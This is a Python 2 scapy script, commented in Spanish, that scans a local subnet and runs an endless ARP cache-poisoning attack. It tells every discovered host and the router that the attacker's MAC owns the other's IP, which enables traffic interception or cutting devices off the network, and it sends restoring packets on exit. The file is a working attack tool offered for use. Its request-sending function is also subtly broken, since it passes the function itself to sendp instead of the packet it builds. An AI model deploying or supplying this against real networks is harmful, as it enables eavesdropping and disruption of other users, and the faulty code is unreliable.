#!/usr/bin/python
## -*- coding: utf-8 -*-

from scapy.all import *
import sys, time

# Ésta función envía una respuesta ARP al dispositivo indicado(deja sin red)
def respuestaARP(ipDestino, macDestino, ipOrigen, macOrigen, interfaz):
    respuesta = Ether(dst=macDestino)/ARP(pdst=ipDestino, hwdst=macDestino,\
                psrc=ipOrigen, hwsrc=macOrigen, op='is-at')
    sendp(respuesta, iface=interfaz)

# Ésta función envía peticiones ARP al dispositivo indicado(inadvertido)
def peticionARP(ipDestino, macDestino, ipOrigen, macOrigen, interfaz):
    peticion = Ether(dst=macDestino)/ARP(pdst=ipDestino, psrc=ipOrigen,\
                hwsrc=macOrigen, op='who-has')
    sendp(peticionARP, iface=interfaz)

def main():
    conf.verb = 0
    ipRouter = '192.168.1.1'
    redesIP = '192.168.1.0/24' # No modificar ésto, crashea srp()
    #redesIP = '192.168.1.4'   # Puede especificar un dispositivo en lugar de toda la red
    interfaz = 'iface'         # Configure iface

    # Obtener MAC del router
    print "Obtener MAC del router"
    # srp1: Envía un paquete a la red y espera hasta que se reciba
    # la primer respuesta, función de capa 2, si responde trae
    # datos del origen(propio) y destino(router)
    router_ = srp1(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ipRouter),\
                iface=interfaz, retry=-2, timeout=2)

    if router_ is None:
        print "El router "+str(ipRouter)+" no responde."
        sys.exit(1)

    # De la petición se obtiene:
    macRouter = router_[ARP].hwsrc
    ipPropia = router_[ARP].pdst
    macPropia = router_[ARP].hwdst

    # Obtener direcciones MAC de los dispositivos activos en la red
    print "Obtener direcciones MAC de los dispositivos activos en la red"
    # srp: Envia y recibe un/muchos paquete/s a la red y espera
    # respuetas, función de capa 2
    respuestasRed, sinRespuestasRed = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/\
                        ARP(pdst=redesIP), iface=interfaz, retry=-2,\
                        timeout=2)
    ipsRed = []
    macsRed = []

    for estimulo,respuesta_ in respuestasRed:
        if(respuesta_[ARP].psrc != ipRouter): # No agregar el router
            ipsRed.append(respuesta_[ARP].psrc)
            macsRed.append(respuesta_[ARP].hwsrc)

    if len(ipsRed) == 0:
        print "No se detectaron dispositivos"
        sys.exit(1)
    else:
        print "Se encontraron "+str(len(ipsRed))+" dispositivos en la red\n"

    # Imprimir en pantalla información del envenenamiento
    print "ROUTER: IP = "+str(ipRouter)+" MAC = "+str(macRouter)+"\n"
    for i in xrange(0, len(ipsRed)):
        print "Dispositivo: IP = "+str(ipsRed[i])+" MAC = "+str(macsRed[i])

    # Se envían respuestas ARP 'is-at' a los dispositivos sin que ellos la hayan solicitado
    # o se envían peticiones ARP 'who-has'.
    try:
        while True:
            for i in xrange(0, len(ipsRed)):
                # Se engaña al dispositivo enviandole el ipRouter y el macPropio
                #respuestaARP(ipsRed[i], macsRed[i], ipRouter, macPropia, interfaz)
                peticionARP(ipsRed[i], macsRed[i], ipRouter, macPropia, interfaz)

                # Se engaña al router enviandole el ipDispositivo y el macPropio
                #respuestaARP(ipRouter, macRouter, ipsRed[i], macPropia, interfaz)
                peticionARP(ipRouter, macRouter, ipsRed[i], macPropia, interfaz)
                time.sleep(5)
    except:
        print "Finalizando envenenamiento"
        for j in range(2): # Por las dudas que lo haga dos veces
            for i in xrange(0, len(ipsRed)):
                # Se apunta al dispositivo el ipRouter y el macRouter
                #respuestaARP(ipsRed[i], macsRed[i], ipRouter, macRouter, interfaz)
                peticionARP(ipsRed[i], macsRed[i], ipRouter, macRouter, interfaz)

                # Se apunta al router el ipDispositivo y el macRouter
                #respuestaARP(ipRouter, macRouter, ipsRed[i], macsRed[i], interfaz)
                peticionARP(ipRouter, macRouter, ipsRed[i], macsRed[i], interfaz)
        print "La cagada esta arreglada"

main()
